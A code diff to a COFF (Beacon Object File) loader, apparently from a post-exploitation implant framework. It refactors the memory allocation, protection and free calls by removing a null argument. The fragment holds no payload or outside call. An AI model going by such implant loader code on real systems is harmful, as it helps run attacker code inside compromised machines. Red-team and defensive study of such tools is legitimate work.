@@ -370,7 +370,7 @@ auto Coff::Loader(
     // allocate memory to store bof
     //
     KhDbg("total memory required: %d bytes (aligned)", MmSize);
-    MmBase = Self->Mm->Alloc( nullptr, nullptr, MmSize, MEM_COMMIT, PAGE_READWRITE );
+    MmBase = Self->Mm->Alloc( nullptr, MmSize, MEM_COMMIT, PAGE_READWRITE );
     if ( !MmBase ) {
         KhDbg("failed to allocate memory for COFF"); goto _KH_END;
     }
@@ -443,7 +443,7 @@ auto Coff::Loader(
         
         if ( SecHdr[j].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
             ULONG NewProt = PAGE_EXECUTE_READ;
-            Self->Mm->Protect(nullptr, CoffData.Sec[j].Base, CoffData.Sec[j].Size, NewProt, &OldProt);
+            Self->Mm->Protect( CoffData.Sec[j].Base, CoffData.Sec[j].Size, NewProt, &OldProt );
         }
     }
 
@@ -476,7 +476,7 @@ auto Coff::Loader(
     }
 
 _KH_END:
-    if ( MmBase       ) Self->Mm->Free( nullptr, MmBase, MmSize, MEM_RELEASE );
+    if ( MmBase       ) Self->Mm->Free( MmBase, MmSize, MEM_RELEASE );
     if ( CoffData.Sec ) Self->Hp->Free( CoffData.Sec );
     if ( CoffData.Sym ) Self->Hp->Free( CoffData.Sym );
 
